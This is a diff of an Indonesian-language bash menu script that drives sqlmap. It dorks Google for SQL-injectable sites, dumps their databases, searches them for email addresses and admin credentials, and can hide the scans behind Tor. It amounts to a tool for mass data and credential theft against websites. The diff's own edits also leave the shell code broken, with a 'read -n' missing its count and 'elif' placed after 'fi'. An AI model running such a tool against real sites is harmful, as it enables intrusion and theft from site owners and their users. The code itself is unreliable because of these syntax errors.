@@ -36,34 +36,34 @@ read -p "root@Sqlbot-#" bcd
 if [ $bcd = 1 ] || [ $bcd = 1 ]
 then
 clear
-read -e "Masukan Dork : "
+read -n -e "Masukan Dork : "
 read dork
 python2 sqlmap.py -g $dork --dbs --batch --tamper=space2comment --keep-alive --risk=2 --level=2 --smart --flush-session --output=Hasil
 echo "Done! Lihat Hasil Dump di folder Hasil"
 fi
 
-if [ $bcd = 2 ] || [ $bcd = 2]
+elif [ $bcd = 2 ] || [ $bcd = 2]
 then
 clear
-read -e "Masukan Hostname Website"
+read -n -e "Masukan Hostname Website"
 read host
 python2 sqlmap.py -u $host --dbs --batch --tamper=space2comment --risk=2 --level=2 --flush-session --search -C mail --output=Hasil_Mail
 echo "Done! Lihat Hasil Dump di folder Hasil_Mail"
 fi
 
-if [ $bcd = 3 ] || [ $bcd = 3 ]
+elif [ $bcd = 3 ] || [ $bcd = 3 ]
 then
 clear
-read -e "Masukan Hostname Website"
+read -n -e "Masukan Hostname Website"
 read host
 python2 sqlmap.py -u $host --dbs --batch --tamper=space2comment --search -C admin,password --level=2 --risk=2 --output=Hasil_Admin_Password
 echo "Done! Lihat Hasil Dump di folder Hasil_Admin_Password"
 fi
 
-if [ $bcd = 4 ] || [ $bcd = 4 ]
+elif [ $bcd = 4 ] || [ $bcd = 4 ]
 then
 clear
-read -e "Masukan Hostname Website"
+read -n -e "Masukan Hostname Website"
 read host
 python2 sqlmap.py -u $host --dbs --batch --tor --tamper=space2comment --risk=2 --level=2
 fi
